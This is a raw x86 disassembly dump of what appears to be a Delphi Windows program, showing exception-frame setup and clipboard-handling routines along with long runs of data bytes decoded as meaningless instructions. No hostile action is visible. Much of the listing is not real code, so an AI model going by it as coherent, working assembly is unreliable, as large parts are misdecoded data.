add [ edx + edi * 4 + 0x28d00042 ] ah
inc edi
add [ edx + edi * 4 + 0x28c80042 ] bl
inc edi
add [ edx + edi * 4 + 0x28c00042 ] dl
inc edi
add [ edx + edi * 4 + 0x28b80042 ] cl
inc edi
add [ edx + edi * 4 + 0x28b00042 ] al
inc edi
add [ edx + edi * 4 + 0x42 ] bh
add [ eax + 0x74004728 ] ch
mov edx 0x28a00042
inc edi
add [ edx + edi * 4 + 0x42 ] ch
add [ eax + 0x64004728 ] bl
mov edx 0x28900042
inc edi
add [ edx + edi * 4 + 0x42 ] bl
add [ eax + 0x54004728 ] cl
mov edx 0x28800042
inc edi
add [ edx + edi * 4 + 0x42 ] cl
add [ eax + 0x28 ] bh
inc edi
add [ edx + edi * 4 + 0x42 ] al
add [ eax + 0x28 ] dh
inc edi
add [ edx + edi * 4 ] bh
inc edx
add [ eax + 0x28 ] ch
inc edi
add [ edx + edi * 4 ] dh
inc edx
add [ eax + 0x28 ] ah
inc edi
add [ edx + edi * 4 ] ch
inc edx
add [ eax + 0x28 ] bl
inc edi
add [ edx + edi * 4 ] ah
inc edx
add [ eax + 0x28 ] dl
inc edi
add [ edx + edi * 4 ] bl
inc edx
add [ eax + 0x28 ] cl
inc edi
add [ edx + edi * 4 ] dl
inc edx
add [ eax + 0x28 ] al
inc edi
add [ edx + edi * 4 ] cl
inc edx
add [ eax ] bh
sub [ edi ] al
add al 0xba
inc edx
add [ eax ] dh
sub [ edi ] al
cld
mov ecx 0x28280042
inc edi
add ah dh
mov ecx 0x28200042
inc edi
add ah ch
mov ecx 0x28180042
inc edi
add ah ah
mov ecx 0x28100042
inc edi
add ah bl
mov ecx 0x28080042
inc edi
add ah dl
mov ecx 0x28000042
inc edi
add ah cl
mov ecx 0x27f80042
inc edi
add ah al
mov ecx 0x27f00042
inc edi
add [ ecx + edi * 4 + 0x27e80042 ] bh
inc edi
add [ ecx + edi * 4 + 0x27e00042 ] dh
inc edi
add [ ecx + edi * 4 + 0x27d80042 ] ch
inc edi
add [ ecx + edi * 4 + 0x27d00042 ] ah
inc edi
add [ ecx + edi * 4 + 0x27c80042 ] bl
inc edi
add [ ecx + edi * 4 + 0x27c00042 ] dl
inc edi
add [ ecx + edi * 4 + 0x27b80042 ] cl
inc edi
add [ ecx + edi * 4 + 0x27b00042 ] al
inc edi
add [ ecx + edi * 4 + 0x42 ] bh
add [ eax + 0x74004727 ] ch
mov ecx 0x8b550042
in al dx
xor eax eax
push ebp
push sub_42bca4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bcab
retn
mov eax rw-data
mov ecx 0x2f
mov edx [ r-xdata ]
call sub_404a68
sub_42bce0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42bd05
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bd0c
retn
sub_42bd1c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
mov ebp 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ ebp + 0x100042 ] 0x0
add [ eax + ebx ] bl
inc ecx
add al bl
xor al 0x40
add ah ah
xor al 0x40
add al ch
xor al 0x40
add ah ch
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
in al dx
retn 0x42
sub_42bd64
mov ah 0xc0
inc edx
add [ ecx + eax * 2 ] bl
inc ecx
add [ edx + eax * 8 ] ah
inc edx
add [ eax - 0x4fffbd42 ] bl
mov ebp 0xbe100042
inc edx
add [ esi + edi * 4 ] bh
inc edx
add [ edx ] cl
push esp
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
nop
nop
mov ebp 0xa070042
push esp
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472616f
mov ebp 0x18900042
inc ecx
add [ eax ] al
add [ edi ] al
inc ebx
insb
imul esi [ eax + 0x62 ] 0x6472
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42bde8
push [ fs : eax ]
mov [ fs : eax ] esp
call EmptyClipboard
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bdef
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42be10
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
call CloseClipboard
cmp [ ebx + 0xc ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x8 ]
call sub_41a62c
sub_42be3c
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
inc [ ebx + 0x4 ]
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ ebx + 0x8 ] eax
test eax eax
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
call OpenClipboard
test eax eax
jne r-xdata
push ebx
push sub_42c290
call sub_41a578
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x1
mov [ ebx + 0xd ] 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
sub_42be98
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x8 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_42beb8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
push 0x1
call GetClipboardData
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42bf2a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_403fe0
mov eax [ ebp - 0x8 ]
push eax
call GlobalLock
mov edx eax
mov eax ebx
call sub_4041d8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x8 ]
push eax
call GlobalUnlock
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42bf31
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub_42bf38
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_42bfda
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
call EnumClipboardFormats
mov ebx eax
test bx bx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b54c
call sub_403a1c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov edx ebx
mov eax [ r-xdata ]
call sub_41f82c
test al al
je r-xdata
movzx eax bx
push eax
call EnumClipboardFormats
mov ebx eax
test bx bx
jne r-xdata
movzx eax bx
push eax
call GetClipboardData
mov esi eax
push 0x9
call GetClipboardData
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41f73c
call sub_403ac8
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42bfe8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42c040
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x2
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
mov esi eax
push esi
mov ecx ebx
mov dx 0x2
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c047
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42c050
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor edx edx
push ebp
push sub_42c0a5
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x3
call GetClipboardData
mov ebx eax
push 0x9
call GetClipboardData
push eax
mov ecx ebx
mov dx 0x3
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x5c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c0ac
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_42c0b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_42bf38
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_42bfe8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414114
mov edx ebx
mov eax esi
call sub_42c050
jmp r-xdata
pop esi
pop ebx
retn
sub_42c11c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42c191
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42bdf4
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
call sub_41f800
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c198
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_42c1a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
xor eax eax
push ebp
push sub_42c215
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_42bdf4
xor eax eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0xa ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x8 ]
push eax
movzx eax [ ebp - 0xa ]
push eax
call SetClipboardData
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c21c
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
mov eax [ ebp - 0x10 ]
push eax
push 0x9
call SetClipboardData
sub_42c224
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_42c11c
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_414030
mov edx ebx
mov eax esi
call sub_42c1a0
jmp r-xdata
pop esi
pop ebx
retn
sub_42c290
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42c2ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c2bf
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
je r-xdata
call sub_403a44
mov ebx [ rw-data ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
jmp r-xdata
call sub_403a98
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c2ec
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414004
test bl bl
jle r-xdata
xor eax eax
mov [ rw-data ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_42c320
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42c351
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c358
retn
mov eax [ rw-data ]
call sub_403290
sub_42c3ee
inc edx
add [ ebx ] al
or eax 0x74754254
je r-xdata
or al 0x62
outsb
dec esp
popad
jns r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jne r-xdata
je r-xdata
jne r-xdata
add [ ecx ] al
or dl [ esi + ecx * 2 + 0x75 ]
insd
inc edx
add [ eax + eax ] ah
add [ eax ] al
les ecx [ ebx + eax * 2 + 0x4034d800 ]
xor al 0x40
add al ah
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
mov [ ecx + eax * 2 + 0x42e25c00 ] bl
outsd
xor al 0x40
add ah ch
inc esp
je r-xdata
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ch
retn
inc ecx
add ah dl
pushfd
inc ecx
add [ eax ] ch
popfd
inc ecx
add [ edi + ecx * 8 - 0x1d7fffbd ] bl
inc edx
add [ eax ] dl
rol [ ebx ] 0x1
int3
push 0x10173
add [ eax ] al
add al 0x0
add ah ah
xor al 0x40
add al ch
arpl [ edi + eax + 0x62 ] si
jae r-xdata
add eax 0x654e7362
ja r-xdata
bound esi [ ebx + 0x57 ]
add ah al
imul ebp [ esi + 0x33 ] 0x73620531
dec esi
ja r-xdata
mov eax eax
nop
les eax [ edx ]
add [ edx ] ecx
inc edx
jne r-xdata
add [ ecx + edx * 8 + 0x43 ] bl
add [ eax - 0x64 ] al
inc edi
insb
jns r-xdata
pushfd
inc ecx
inc ecx
add [ eax - 0xfffbc30 ] dh
je r-xdata
add [ esp + ebx * 4 - 0x2f4fffbf ] bh
inc ebx
add al dh
outsb
jae r-xdata
je r-xdata
push esp
dec esi
jne r-xdata
rcl [ eax + 0x10042c4 ] 0xa
or ah [ edx + 0x6c ]
inc edi
insb
bound ebp [ edi + eax * 2 + 0x6c ]
jns r-xdata
add [ eax ] al
lea eax [ eax ]
hlt
add [ ecx ] eax
add [ eax ] al
add [ eax + eax ] al
push 0xd706f54
bound ebp [ edi + eax * 2 + 0x6c ]
push 0x68676952
je r-xdata
add ah dh
les eax [ edx ]
push 0x74746f42
outsd
insd
pop es
inc edx
jne r-xdata
jns r-xdata
or eax 0x6c476c62
jns r-xdata
bound ebp [ edi + eax * 2 + 0x6c ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
jae r-xdata
adc [ eax - 0x20 ] ch
retn
ror [ esp + eax * 8 + 0x42 ] 0x0
add ecx [ esp + edx * 2 ]
inc edx
jne r-xdata
add [ eax ] al
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x3b ] dh
outsb
push ebx
je r-xdata
mov [ ebx ] es
fdiv [ eax + eax * 2 ]
jae r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax - 0x3c ] cl
inc edx
add [ edx ] cl
sub_42c58c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fadd st6
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 8 + 0x42 ] ah
add dh al
mov [ edx ] 0x84
add [ eax ] eax
add [ edx - 0x6463ffbd ] dh
inc ecx
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add [ ebp + esi * 8 + 0x32280043 ] dl
inc eax
add [ edx + esi + 0x40 ] al
add ah bh
jecxz r-xdata
fild [ ebx ]
cmp bl bl
inc ebx
add [ eax - 0x1c ] ah
inc ebx
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
add [ edx + eax + 0x44 ] dh
add [ esi + esi * 8 + 0x43 ] ch
add [ eax ] dh
inc eax
inc ecx
add al dl
call 0xffffffffd65ec628
inc ebx
add [ eax + 0x340043d5 ] cl
fild [ ebx ]
mov ah 0x9b
inc ecx
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 - 0x1cc3ffbf ] bh
inc edx
add [ ecx + esi * 8 ] al
inc ebx
add [ eax ] al
int1
inc ebx
add al dl
int1
inc ebx
add [ eax - 0x2bffbc2c ] dl
sar edi cl
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
adc al 0xed
inc edx
add [ eax - 0x13 ] cl
inc edx
add [ eax + 0x500042ed ] bh
out dx al
inc edx
add [ eax - 0x12 ] bl
inc edx
add [ eax - 0x12 ] ah
inc edx
add [ esi + ebp * 8 - 0x1107ffbe ] al
inc edx
add al dh
out dx eax
inc edx
add [ eax ] cl
jmp r-xdata
add [ eax ] al
hlt
je r-xdata
push [ eax ]
add dh bh
jo r-xdata
outsd
outsb
jae r-xdata
add [ eax + 0x3 ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000e ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ eax ] dl
inc eax
add [ edx + 0x1 ] dh
add bh bh
loopne r-xdata
add ah cl
and eax 0x3c0041
add dh bh
rcl ah 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4106000b ] al
add [ eax ] eax
inc eax
adc [ ecx ] al
pop edi
add [ eax ] al
add bh bh
push esp
push es
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b000f ] al
outsd
outsb
jae r-xdata
or [ ebx ] 0x0
push es
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or al [ ecx + 0x6c ]
insb
outsd
ja r-xdata
add [ fs : eax ] al
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0xb465646f
pop [ ebx ]
je r-xdata
inc edx
insb
insb
push ebp
jo r-xdata
add [ edi ] al
inc ebx
popad
jo r-xdata
imul ebp [ esi + 0x74 ] 0x40103c73
add [ eax + 0x1 ] ch
add bh bh
cmp ah ch
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ edi + 0x72 ]
outsd
jne r-xdata
or eax 0x6e410700
arpl [ eax + 0x6f ] bp
jb r-xdata
aad 0x43
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
pop [ ebx ]
popad
add [ eax ] al
jmp [ eax + 0x3c0043d4 ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x47050016 ] al
insb
jns r-xdata
imul ebp [ edi + 0x6e ] r-xdata
push eax
add [ eax ] al
sbb al 0xec
dec ecx
outsb
js r-xdata
loop r-xdata
push r-xdata
jae r-xdata
add [ eax - 0x80000000 ] al
push ss
add [ 0x70796c47 ] al
scasd [ edi ]
inc ecx
add [ eax ] ch
add bh bh
inc eax
loop r-xdata
adc [ eax ] al
jo r-xdata
add [ eax ] dl
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
dec [ esp + ebp * 8 + 0x42 ]
add [ ecx ] al
add [ eax ] al
add bh bh
dec esp
in al dx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
pop ss
add [ esi ] al
dec esp
popad
jns r-xdata
add [ eax - 0x1e ] dl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040015 ] al
outsd
outsb
je r-xdata
[ ebx + ebp * 8 + 0x10042 ]
add bh bh
lodsb [ esi ]
jmp r-xdata
add al 0x0
add [ eax ] al
pop ds
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
jo r-xdata
outsb
je r-xdata
add [ edx - 0x3f010000 ] bl
loop r-xdata
jne r-xdata
cmp al 0x10
inc eax
add [ ecx + eax ] bh
[ eax - 0x14 ]
mov eax 0xeb100041
inc edx
add [ ebx + ebp * 8 ] bl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
add al 0x46
insb
popad
je r-xdata
pushfd
add [ eax + eax ] eax
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ eax + 0x1cff0001 ] al
in al dx
add [ eax ] al
and [ edx ] 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
arpl [ ecx + 0x6e ] bp
add [ bx + si ] dl
inc eax
add [ eax + 0x1 ] bh
add bh bh
movsb [ edi ] [ esi ]
in al dx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
sbb [ esi ] 0x0
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7c65646f
xlat
add [ eax ] al
[ eax + 0x43 ]
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
outsb
je r-xdata
dec ebp
outsd
jl r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
push cs
push eax
popad
jb r-xdata
inc ebx
jne r-xdata
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0024 ] al
outsb
popad
jb r-xdata
outsb
imul ebp [ esi + 0x74 ] r-xdata
add [ eax ] eax
jmp [ esp + ebp * 8 + 0x10042 ]
outsb
adc [ eax ] al
0xc0ff0000 0x43e2
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
inc esp
add [ eax + eax ] bh
inc [ ecx ]
inc ebx
add [ ecx ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
push 0x6948776f
outsb
je r-xdata
outsb
je r-xdata
add [ esi + 0x300042cc ] ch
add al [ eax ]
add [ ecx - 0x6463ffbd ] ah
inc ecx
add ah ah
xor al 0x40
add al dh
xchg esp eax
inc ecx
add ah ch
xor al 0x40
add al ah
and al 0x44
je r-xdata
call 0xffffffffd8430e21
add [ eax ] al
imul esp [ ebx + 0x6b ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
insb
inc ebx
insb
je r-xdata
outsb
adc [ eax ] al
push edi
add [ edi ] al
push ebx
jo r-xdata
dec [ eax + 0x10042ec ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ edi ] bl
add bh bh
mov ah ch
inc edx
add [ ecx ] al
adc [ eax ] al
cdq
add [ eax ] al
[ edx - 0x1d9bffbd ]
push esp
jb r-xdata
je r-xdata
adc [ eax ] al
jne r-xdata
push 0x6948776f
outsb
je r-xdata
inc esp
add [ ebx ] dh
inc ebx
add al ah
loope r-xdata
int3
insd
add al 0x62
imul ecx [ edi + 0x4b ] 0x8
bound ebp [ ebx + 0x43 ]
popad
outsb
arpl [ ebp + 0x6c ] sp
push es
bound ebp [ ebx + 0x48 ]
insb
jo r-xdata
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
add [ eax ] al
and [ ebx ] 0x0
outsb
jae r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc esp
add [ edi + 0x44 ] cl
add [ eax + 0x5b ] dh
inc esp
add al bh
inc ebp
inc esp
add al ch
dec eax
inc esp
add [ eax ] al
push esp
inc ebx
add [ esp + edx * 2 ] ah
inc ebx
add [ eax + 0xa0042f1 ] bh
add [ esp + edi * 4 ] ch
sub edi [ esi + ecx + 0x13b00cb0 ]
mov al 0x14
mov al 0x3
add ch bh
call edi
add [ ebx + 0x497c0044 ] al
add [ eax ] ch
push esp
inc ebx
add [ esp + eax + 0x479c0044 ] bh
inc esp
add [ eax + 0x48 ] bl
inc esp
add [ ebx + eax * 2 + 0x44 ] dl
add [ eax + ecx * 2 ] bh
inc esp
add ah dl
or [ eax + eax + 0x68 ] eax
adc [ eax + eax + 0x7c ] al
int1
inc edx
add [ eax - 0xfffbd0f ] ch
sbb al [ eax + eax - 0x60 ]
push esi
inc ebx
add [ eax - 0x5bffbbe2 ] ah
push ds
inc esp
add [ ebp + ebx + 0x44 ] bl
add al 0x62
imul ecx [ esi + 0x6f ] 0x7
bound ebp [ ebx + 0x59 ]
jae r-xdata
loopne r-xdata
pop es
bound ebp [ ebx + 0x41 ]
bound ebp [ edi + 0x72 ]
je r-xdata
bound ebp [ ebx + 0x43 ]
insb
outsd
pop es
bound ebp [ ebx + 0x4e ]
outsd
add [ edi + ebx * 8 ] dh
inc ebx
add [ ebx + ebx * 4 - 0x6763ffbf ] dh
inc esp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
inc eax
int1
inc edx
add [ eax - 0x57ffbbac ] al
sbb al 0x44
add [ eax ] dh
inc esp
or [ edx + 0x6b ] ah
bound ebp [ ebx + 0x52 ]
je r-xdata
inc eax
inc ecx
add [ edx + eax ] bh
add eax 0x6c416b62
insb
pop es
inc edx
jne r-xdata
inc esp
add [ esi + edx * 8 ] bl
inc ebx
add [ ecx + ecx + 0x44 ] bl
cmp al 0x2
jns r-xdata
inc ecx
add [ eax + ebx * 4 - 0x6443ffbf ] dl
inc ecx
add [ eax - 0x6bffbd10 ] dl
dec edi
inc esp
add [ eax - 0x3ffbbac ] dh
je r-xdata
outsb
outsd
jb r-xdata
bound ebp [ ebx + 0x49 ]
push ebx
inc esp
add [ eax + 0x100043d4 ] dl
dec edx
inc esp
add [ eax ] dh
dec edx
inc esp
add [ eax + 0x47 ] cl
inc esp
add al bl
rol [ ebx ] cl
fcom st3
inc ebx
add [ esp + eax ] cl
inc esp
add [ eax ] bh
add al 0x44
add [ edi + ebx * 8 ] bl
inc ebx
add [ ebp + edx * 8 + 0x43 ] dl
add [ eax + 0x200043e0 ] ch
loopne r-xdata
add [ eax + ebx * 4 - 0x676bffbf ] bl
inc ecx
add [ ebx + ebx * 4 - 0xf6fffbf ] bh
inc edx
add [ edi + ecx * 2 + 0x54b00044 ] dl
inc esp
add ah bh
outsb
jae r-xdata
inc edx
add [ ebx ] al
or edx [ edx + eax * 2 + 0x69 ]
je r-xdata
rcr [ ebx + ecx * 8 + 0x42 ] 0x0
jae r-xdata
je r-xdata
dec ecx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ecx * 8 + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
